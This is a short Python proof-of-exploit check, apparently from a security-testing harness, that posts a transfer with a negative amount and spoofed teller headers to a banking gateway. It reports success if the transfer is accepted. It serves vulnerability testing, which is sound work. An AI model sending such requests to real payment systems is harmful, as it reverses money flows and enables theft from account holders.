"""LG-BIZ-001 proof-of-exploit: negative-amount transfer.

Fires when a transfer with a NEGATIVE amount is accepted (status=POSTED) and the balances move
backwards (the from-account rises). A correct core rejects amount <= 0, so this never fires on
`fixed`. Unconditional (any profile). Env: GATEWAY_URL.
"""

from harness import env, http


def fire():
    reply = http.post_json(
        f"{env.url('GATEWAY_URL')}/transfer",
        {"token": "TRIGGERTOKEN0001", "from_account": "000000000042", "to_account": "000000000043",
         "amount": "-100.00", "currency": "USD", "requested_by": "0000000007"},
        headers={"X-Staff-Id": "TLR001", "X-Role": "TELLER", "X-Branch": "0007"},
    )
    reply_json = reply.json()
    # Exploited iff a negative amount POSTED. (from_balance rising vs a normal debit corroborates it.)
    if reply_json.get("status") == "POSTED":
        return True, f"negative amount POSTED (from_balance={reply_json.get('from_balance', '')}) -> {reply.text}"
    return False, reply.text
